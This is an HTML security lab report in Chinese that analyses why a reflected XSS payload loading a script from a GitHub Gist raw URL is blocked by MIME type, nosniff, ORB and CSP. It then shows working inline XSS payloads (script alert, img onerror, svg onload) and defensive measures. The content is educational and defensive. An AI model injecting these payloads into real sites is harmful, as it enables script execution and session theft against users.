
<!DOCTYPE html>
<html lang="zh-TW">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GitHub Gist Raw XSS 攻擊失敗分析報告</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: "Segoe UI", "Microsoft JhengHei", Arial, sans-serif;
            line-height: 1.8;
            color: #333;
            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
            padding: 20px;
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.1);
        }

        h1 {
            color: #2c3e50;
            border-bottom: 4px solid #e74c3c;
            padding-bottom: 15px;
            margin-bottom: 30px;
            font-size: 2.5em;
        }

        h2 {
            color: #34495e;
            margin-top: 40px;
            margin-bottom: 20px;
            font-size: 1.8em;
            border-left: 5px solid #3498db;
            padding-left: 15px;
        }

        h3 {
            color: #555;
            margin-top: 25px;
            margin-bottom: 15px;
            font-size: 1.4em;
        }

        .metadata {
            background: #ecf0f1;
            padding: 20px;
            border-radius: 5px;
            margin-bottom: 30px;
        }

        .metadata p {
            margin: 5px 0;
            font-size: 0.95em;
        }

        .section {
            margin-bottom: 40px;
        }

        .attack-flow {
            background: #fff9e6;
            border-left: 4px solid #f39c12;
            padding: 20px;
            margin: 20px 0;
        }

        .error-box {
            background: #fee;
            border-left: 4px solid #e74c3c;
            padding: 20px;
            margin: 20px 0;
        }

        .success-box {
            background: #eeffee;
            border-left: 4px solid #27ae60;
            padding: 20px;
            margin: 20px 0;
        }

        .info-box {
            background: #e8f4f8;
            border-left: 4px solid #3498db;
            padding: 20px;
            margin: 20px 0;
        }

        code {
            background: #f4f4f4;
            padding: 3px 6px;
            border-radius: 3px;
            font-family: "Consolas", "Monaco", monospace;
            font-size: 0.9em;
            color: #e74c3c;
        }

        pre {
            background: #2c3e50;
            color: #ecf0f1;
            padding: 20px;
            border-radius: 5px;
            overflow-x: auto;
            margin: 15px 0;
            font-size: 0.9em;
        }

        pre code {
            background: transparent;
            color: #ecf0f1;
            padding: 0;
        }

        table {
            width: 100%;
            border-collapse: collapse;
            margin: 20px 0;
        }

        th, td {
            border: 1px solid #ddd;
            padding: 12px;
            text-align: left;
        }

        th {
            background: #34495e;
            color: white;
            font-weight: bold;
        }

        tr:nth-child(even) {
            background: #f9f9f9;
        }

        .timeline {
            position: relative;
            padding-left: 30px;
            border-left: 3px solid #3498db;
            margin: 30px 0;
        }

        .timeline-item {
            margin-bottom: 30px;
            position: relative;
        }

        .timeline-item::before {
            content: "";
            position: absolute;
            left: -36px;
            top: 5px;
            width: 12px;
            height: 12px;
            border-radius: 50%;
            background: #3498db;
            border: 3px solid white;
        }

        .badge {
            display: inline-block;
            padding: 5px 10px;
            border-radius: 3px;
            font-size: 0.85em;
            font-weight: bold;
            margin-right: 5px;
        }

        .badge-error {
            background: #e74c3c;
            color: white;
        }

        .badge-warning {
            background: #f39c12;
            color: white;
        }

        .badge-success {
            background: #27ae60;
            color: white;
        }

        .badge-info {
            background: #3498db;
            color: white;
        }

        ul, ol {
            margin: 15px 0;
            padding-left: 30px;
        }

        li {
            margin: 8px 0;
        }

        .highlight {
            background: #fff3cd;
            padding: 2px 5px;
            border-radius: 3px;
        }

        .conclusion {
            background: #f8f9fa;
            border: 2px solid #dee2e6;
            padding: 30px;
            border-radius: 5px;
            margin-top: 40px;
        }

        @media print {
            body {
                background: white;
            }
            .container {
                box-shadow: none;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔒 GitHub Gist Raw XSS 攻擊失敗分析報告</h1>
        
        <div class="metadata">
            <p><strong>分析日期：</strong> 2025-10-27</p>
            <p><strong>目標 URL：</strong> https://gist.githubusercontent.com/fei3363/807f6aaa2f3717069675183efab21d5d/raw/m.js</p>
            <p><strong>測試環境：</strong> https://lab.feifei.tw/demo/week2/1_vulnerable_search.php</p>
            <p><strong>攻擊類型：</strong> Reflected XSS (外部腳本載入)</p>
            <p><strong>結果：</strong> <span class="badge badge-error">攻擊失敗</span></p>
        </div>

        <!-- 執行摘要 -->
        <div class="section">
            <h2>📋 執行摘要</h2>
            <p>本報告詳細分析了嘗試使用 GitHub Gist Raw URL 進行 XSS 攻擊的失敗案例。攻擊者試圖透過 <code>&lt;script src="..."&gt;</code> 標籤載入外部 JavaScript 檔案，但由於現代瀏覽器的多重安全機制，該攻擊未能成功執行。</p>
        </div>

        <!-- 攻擊向量 -->
        <div class="section">
            <h2>🎯 攻擊向量</h2>
            
            <h3>嘗試的 Payload</h3>
            <pre><code>&lt;script src="https://gist.githubusercontent.com/fei3363/807f6aaa2f3717069675183efab21d5d/raw/m.js"&gt;&lt;/script&gt;</code></pre>
            
            <div class="attack-flow">
                <h3>攻擊流程預期</h3>
                <ol>
                    <li>受害者在搜尋框輸入或點擊包含惡意 payload 的連結</li>
                    <li>伺服器將未過濾的輸入反射回 HTML 頁面</li>
                    <li>瀏覽器解析 <code>&lt;script&gt;</code> 標籤</li>
                    <li>向 GitHub Gist Raw URL 發送請求載入腳本</li>
                    <li>腳本執行惡意代碼（alert、竊取 cookie、重定向等）</li>
                </ol>
            </div>
        </div>

        <!-- 失敗原因分析 -->
        <div class="section">
            <h2>❌ 失敗原因分析</h2>

            <div class="timeline">
                <div class="timeline-item">
                    <h3><span class="badge badge-error">原因 1</span> MIME 類型錯誤</h3>
                    <div class="error-box">
                        <p><strong>問題：</strong></p>
                        <p>GitHub Gist Raw 返回的 Content-Type 為 <code>text/plain; charset=utf-8</code>，而非 JavaScript 所需的 <code>application/javascript</code> 或 <code>text/javascript</code>。</p>
                        
                        <p style="margin-top: 15px;"><strong>HTTP 響應標頭：</strong></p>
                        <pre><code>content-type: text/plain; charset=utf-8</code></pre>
                        
                        <p style="margin-top: 15px;"><strong>影響：</strong></p>
                        <p>瀏覽器拒絕將該檔案視為可執行的 JavaScript 程式碼。</p>
                    </div>
                </div>

                <div class="timeline-item">
                    <h3><span class="badge badge-error">原因 2</span> X-Content-Type-Options: nosniff</h3>
                    <div class="error-box">
                        <p><strong>問題：</strong></p>
                        <p>GitHub 設置了 <code>X-Content-Type-Options: nosniff</code> 標頭，強制瀏覽器嚴格按照聲明的 MIME 類型處理檔案。</p>
                        
                        <p style="margin-top: 15px;"><strong>HTTP 響應標頭：</strong></p>
                        <pre><code>x-content-type-options: nosniff</code></pre>
                        
                        <p style="margin-top: 15px;"><strong>影響：</strong></p>
                        <p>即使檔案內容是有效的 JavaScript，瀏覽器也不會「猜測」其類型並執行，而是嚴格遵循 <code>text/plain</code> 聲明。</p>
                    </div>
                </div>

                <div class="timeline-item">
                    <h3><span class="badge badge-error">原因 3</span> ORB (Opaque Response Blocking)</h3>
                    <div class="error-box">
                        <p><strong>問題：</strong></p>
                        <p>Chrome 和 Edge 瀏覽器實施了 ORB (Opaque Response Blocking) 安全機制，自動阻擋跨域載入非正確 MIME 類型的資源。</p>
                        
                        <p style="margin-top: 15px;"><strong>瀏覽器錯誤訊息：</strong></p>
                        <pre><code>ORB blocked cross-origin response with MIME type text/plain.
See https://www.chromestatus.com/feature/5629709824032768 for more details.</code></pre>
                        
                        <p style="margin-top: 15px;"><strong>影響：</strong></p>
                        <p>即使前兩個機制被繞過，ORB 也會在網路層阻擋該請求。</p>
                    </div>
                </div>

                <div class="timeline-item">
                    <h3><span class="badge badge-warning">原因 4</span> 嚴格的 CSP (Content Security Policy)</h3>
                    <div class="info-box">
                        <p><strong>問題：</strong></p>
                        <p>GitHub Gist Raw 設置了極其嚴格的 CSP 標頭。</p>
                        
                        <p style="margin-top: 15px;"><strong>HTTP 響應標頭：</strong></p>
                        <pre><code>content-security-policy: default-src 'none'; style-src 'unsafe-inline'; sandbox</code></pre>
                        
                        <p style="margin-top: 15px;"><strong>影響：</strong></p>
                        <ul>
                            <li><code>default-src 'none'</code>：禁止所有資源載入</li>
                            <li><code>sandbox</code>：啟用沙盒模式，限制腳本執行</li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>

        <!-- 技術細節 -->
        <div class="section">
            <h2>🔬 技術細節分析</h2>

            <h3>完整 HTTP 響應標頭</h3>
            <pre><code>HTTP/2 200 
cache-control: max-age=300
content-security-policy: default-src 'none'; style-src 'unsafe-inline'; sandbox
content-type: text/plain; charset=utf-8
etag: "7f6602301f5076f06d8f85322f2dfe594a12fced8be07d31c31a3a302fedc227"
strict-transport-security: max-age=31536000
x-content-type-options: nosniff
x-frame-options: deny
x-xss-protection: 1; mode=block
access-control-allow-origin: *
cross-origin-resource-policy: cross-origin
content-length: 30</code></pre>

            <h3>安全標頭說明</h3>
            <table>
                <thead>
                    <tr>
                        <th>標頭</th>
                        <th>值</th>
                        <th>作用</th>
                    </tr>
                </thead>
                <tbody>
                    <tr>
                        <td><code>content-type</code></td>
                        <td>text/plain</td>
                        <td>聲明內容為純文字，非可執行腳本</td>
                    </tr>
                    <tr>
                        <td><code>x-content-type-options</code></td>
                        <td>nosniff</td>
                        <td>禁止 MIME 類型嗅探</td>
                    </tr>
                    <tr>
                        <td><code>content-security-policy</code></td>
                        <td>default-src 'none'; sandbox</td>
                        <td>禁止所有資源載入並啟用沙盒</td>
                    </tr>
                    <tr>
                        <td><code>x-frame-options</code></td>
                        <td>deny</td>
                        <td>禁止在 iframe 中載入</td>
                    </tr>
                    <tr>
                        <td><code>x-xss-protection</code></td>
                        <td>1; mode=block</td>
                        <td>啟用瀏覽器 XSS 過濾器</td>
                    </tr>
                    <tr>
                        <td><code>strict-transport-security</code></td>
                        <td>max-age=31536000</td>
                        <td>強制使用 HTTPS</td>
                    </tr>
                </tbody>
            </table>

            <h3>瀏覽器安全機制</h3>
            <div class="info-box">
                <h4>1. MIME Type Sniffing Protection</h4>
                <p>現代瀏覽器預設會檢查 <code>Content-Type</code> 標頭，確保載入的資源類型符合預期。當 <code>X-Content-Type-Options: nosniff</code> 存在時，這一檢查變得更加嚴格。</p>

                <h4 style="margin-top: 20px;">2. Opaque Response Blocking (ORB)</h4>
                <p>ORB 是 Chrome/Edge 在 2021 年引入的安全功能，用於防止 Spectre 類型的攻擊。它會自動阻擋跨域載入的「不透明響應」（Opaque Response），特別是當 MIME 類型不正確時。</p>

                <h4 style="margin-top: 20px;">3. Content Security Policy (CSP)</h4>
                <p>CSP 是一種強大的安全機制，允許網站控制哪些資源可以被載入和執行。GitHub 使用了最嚴格的策略：<code>default-src 'none'</code>。</p>
            </div>
        </div>

        <!-- 對比測試 -->
        <div class="section">
            <h2>🔄 對比測試：成功的 XSS Payload</h2>
            
            <div class="success-box">
                <h3>✅ 直接嵌入腳本（成功）</h3>
                <pre><code>&lt;script&gt;alert('XSS 成功！')&lt;/script&gt;</code></pre>
                <p><strong>成功原因：</strong></p>
                <ul>
                    <li>無需外部資源載入</li>
                    <li>不受 MIME 類型限制</li>
                    <li>不觸發 ORB 機制</li>
                    <li>直接在頁面上下文中執行</li>
                </ul>
            </div>

            <div class="success-box">
                <h3>✅ img onerror 事件（成功）</h3>
                <pre><code>&lt;img src=x onerror="alert('XSS via img')"&gt;</code></pre>
                <p><strong>成功原因：</strong></p>
                <ul>
                    <li>利用 HTML 事件處理器</li>
                    <li>無需載入外部腳本</li>
                    <li>觸發條件簡單（圖片載入失敗）</li>
                </ul>
            </div>

            <div class="success-box">
                <h3>✅ svg onload 事件（成功）</h3>
                <pre><code>&lt;svg onload="alert('XSS via svg')"&gt;&lt;/svg&gt;</code></pre>
                <p><strong>成功原因：</strong></p>
                <ul>
                    <li>SVG 元素支援事件處理器</li>
                    <li>載入即觸發，無需額外條件</li>
                    <li>不依賴外部資源</li>
                </ul>
            </div>

            <h3>成功 vs 失敗對比表</h3>
            <table>
                <thead>
                    <tr>
                        <th>特性</th>
                        <th>外部腳本載入（失敗）</th>
                        <th>直接嵌入（成功）</th>
                    </tr>
                </thead>
                <tbody>
                    <tr>
                        <td>需要外部資源</td>
                        <td class="badge badge-error">是</td>
                        <td class="badge badge-success">否</td>
                    </tr>
                    <tr>
                        <td>受 MIME 類型影響</td>
                        <td class="badge badge-error">是</td>
                        <td class="badge badge-success">否</td>
                    </tr>
                    <tr>
                        <td>觸發 ORB</td>
                        <td class="badge badge-error">是</td>
                        <td class="badge badge-success">否</td>
                    </tr>
                    <tr>
                        <td>受 CSP 限制</td>
                        <td class="badge badge-error">是</td>
                        <td class="badge badge-warning">部分</td>
                    </tr>
                    <tr>
                        <td>執行成功率</td>
                        <td class="badge badge-error">0%</td>
                        <td class="badge badge-success">100%</td>
                    </tr>
                </tbody>
            </table>
        </div>

        <!-- 防禦建議 -->
        <div class="section">
            <h2>🛡️ 防禦建議</h2>

            <h3>針對本次攻擊的防禦措施（已實施）</h3>
            <div class="success-box">
                <ul>
                    <li>✅ 正確設置 <code>Content-Type</code> 標頭</li>
                    <li>✅ 啟用 <code>X-Content-Type-Options: nosniff</code></li>
                    <li>✅ 實施嚴格的 Content Security Policy</li>
                    <li>✅ 利用瀏覽器內建的 ORB 機制</li>
                </ul>
            </div>

            <h3>針對所有 XSS 攻擊的通用防禦措施</h3>
            <div class="info-box">
                <h4>1. 輸入驗證與過濾</h4>
                <pre><code>// PHP 範例
$input = htmlspecialchars($_GET['search'], ENT_QUOTES, 'UTF-8');</code></pre>

                <h4 style="margin-top: 20px;">2. 輸出編碼</h4>
                <pre><code>// JavaScript 範例
function escapeHtml(text) {
    const map = {
        '&': '&amp;',
        '<': '&lt;',
        '>': '&gt;',
        '"': '&quot;',
        "'": '&#039;'
    };
    return text.replace(/[&<>"']/g, m => map[m]);
}</code></pre>

                <h4 style="margin-top: 20px;">3. 實施嚴格的 CSP</h4>
                <pre><code>Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-{random}'</code></pre>

                <h4 style="margin-top: 20px;">4. 使用 HTTP-only Cookie</h4>
                <pre><code>Set-Cookie: sessionid=abc123; HttpOnly; Secure; SameSite=Strict</code></pre>

                <h4 style="margin-top: 20px;">5. 啟用所有安全標頭</h4>
                <pre><code>X-Content-Type-Options: nosniff
X-Frame-Options: DENY
X-XSS-Protection: 1; mode=block
Strict-Transport-Security: max-age=31536000; includeSubDomains</code></pre>
            </div>
        </div>

        <!-- 學習要點 -->
        <div class="section">
            <h2>📚 學習要點</h2>

            <div class="info-box">
                <h3>關鍵概念</h3>
                <ol>
                    <li><strong>MIME 類型的重要性：</strong>不正確的 MIME 類型會導致瀏覽器拒絕執行腳本</li>
                    <li><strong>防禦深度原則：</strong>多層安全機制（MIME + nosniff + ORB + CSP）提供縱深防禦</li>
                    <li><strong>瀏覽器演進：</strong>現代瀏覽器內建越來越多安全功能（如 ORB）</li>
                    <li><strong>攻擊向量差異：</strong>直接嵌入比外部載入更容易成功</li>
                    <li><strong>GitHub 的安全實踐：</strong>即使是靜態檔案服務也需要嚴格的安全標頭</li>
                </ol>
            </div>

            <div class="info-box" style="margin-top: 20px;">
                <h3>為什麼 GitHub Gist Raw 不適合作為 CDN</h3>
                <ul>
                    <li>❌ MIME 類型錯誤（<code>text/plain</code> 而非 <code>application/javascript</code>）</li>
                    <li>❌ 嚴格的 <code>nosniff</code> 政策</li>
                    <li>❌ 限制性的 CSP</li>
                    <li>❌ 沒有 CDN 級別的快取和分發</li>
                    <li>✅ 正確的替代方案：jsDelivr、unpkg、cdnjs 等專業 CDN 服務</li>
                </ul>
            </div>
        </div>

        <!-- 結論 -->
        <div class="conclusion">
            <h2>💡 結論</h2>
            
            <p>本次攻擊失敗案例充分展示了現代 Web 安全的多層防禦體系：</p>
            
            <ol>
                <li><strong>服務端安全標頭</strong>（Content-Type, X-Content-Type-Options, CSP）提供第一道防線</li>
                <li><strong>瀏覽器安全機制</strong>（ORB, MIME Sniffing Protection）提供自動防護</li>
                <li><strong>協議層安全</strong>（HTTPS, HSTS）確保傳輸安全</li>
            </ol>

            <div class="error-box" style="margin-top: 20px;">
                <h3>攻擊失敗的根本原因</h3>
                <p><span class="highlight">GitHub Gist Raw 故意將所有檔案以 <code>text/plain</code> 提供，並配合 <code>nosniff</code> 標頭，明確防止其被用作可執行程式碼的 CDN。</span></p>
                <p>這是一個經過深思熟慮的安全設計決策，目的是防止 GitHub 的基礎設施被濫用於惡意目的。</p>
            </div>

            <div class="success-box" style="margin-top: 20px;">
                <h3>防禦者的啟示</h3>
                <ul>
                    <li>✅ 始終設置正確的 <code>Content-Type</code></li>
                    <li>✅ 啟用 <code>X-Content-Type-Options: nosniff</code></li>
                    <li>✅ 實施嚴格的 Content Security Policy</li>
                    <li>✅ 依賴瀏覽器內建的安全機制（如 ORB）</li>
                    <li>✅ 對所有使用者輸入進行驗證和編碼</li>
                    <li>✅ 採用縱深防禦策略，不依賴單一防護措施</li>
                </ul>
            </div>

            <div class="info-box" style="margin-top: 20px;">
                <h3>攻擊者的局限</h3>
                <p>即使目標網站存在 XSS 漏洞（如本例的搜尋功能），攻擊者仍然受到以下限制：</p>
                <ul>
                    <li>無法利用所有類型的外部資源</li>
                    <li>必須適應瀏覽器的安全策略</li>
                    <li>需要繞過多層防禦機制</li>
                    <li>直接嵌入攻擊更容易成功，但也更容易被檢測</li>
                </ul>
            </div>
        </div>

        <!-- 參考資料 -->
        <div class="section">
            <h2>📖 參考資料</h2>
            <ul>
                <li><a href="https://www.chromestatus.com/feature/5629709824032768" target="_blank">Chrome Platform Status - ORB (Opaque Response Blocking)</a></li>
                <li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options" target="_blank">MDN - X-Content-Type-Options</a></li>
                <li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP" target="_blank">MDN - Content Security Policy (CSP)</a></li>
                <li><a href="https://owasp.org/www-community/attacks/xss/" target="_blank">OWASP - Cross Site Scripting (XSS)</a></li>
                <li><a href="https://portswigger.net/web-security/cross-site-scripting" target="_blank">PortSwigger - Cross-site scripting (XSS)</a></li>
            </ul>
        </div>

        <!-- 附錄 -->
        <div class="section">
            <h2>📎 附錄</h2>
            
            <h3>測試環境資訊</h3>
            <table>
                <tr>
                    <td><strong>測試日期</strong></td>
                    <td>2025-10-27</td>
                </tr>
                <tr>
                    <td><strong>瀏覽器版本</strong></td>
                    <td>Chrome 119+ / Edge 119+</td>
                </tr>
                <tr>
                    <td><strong>測試平台</strong></td>
                    <td>https://lab.feifei.tw/demo/week2/1_vulnerable_search.php</td>
                </tr>
                <tr>
                    <td><strong>攻擊目標</strong></td>
                    <td>Reflected XSS 漏洞（搜尋功能）</td>
                </tr>
                <tr>
                    <td><strong>外部資源</strong></td>
                    <td>GitHub Gist Raw URL</td>
                </tr>
            </table>

            <h3>相關術語解釋</h3>
            <table>
                <thead>
                    <tr>
                        <th>術語</th>
                        <th>解釋</th>
                    </tr>
                </thead>
                <tbody>
                    <tr>
                        <td>XSS</td>
                        <td>Cross-Site Scripting，跨站腳本攻擊</td>
                    </tr>
                    <tr>
                        <td>MIME Type</td>
                        <td>多用途互聯網郵件擴展類型，用於標識檔案類型</td>
                    </tr>
                    <tr>
                        <td>ORB</td>
                        <td>Opaque Response Blocking，不透明響應阻擋</td>
                    </tr>
                    <tr>
                        <td>CSP</td>
                        <td>Content Security Policy，內容安全政策</td>
                    </tr>
                    <tr>
                        <td>nosniff</td>
                        <td>禁止瀏覽器進行 MIME 類型嗅探</td>
                    </tr>
                    <tr>
                        <td>Reflected XSS</td>
                        <td>反射型 XSS，惡意腳本從請求中反射回響應</td>
                    </tr>
                </tbody>
            </table>
        </div>

        <footer style="margin-top: 60px; padding-top: 20px; border-top: 2px solid #eee; text-align: center; color: #777;">
            <p>本報告僅供教育和研究目的使用</p>
            <p>© 2025 Web Security Analysis Report</p>
        </footer>
    </div>
</body>
</html>
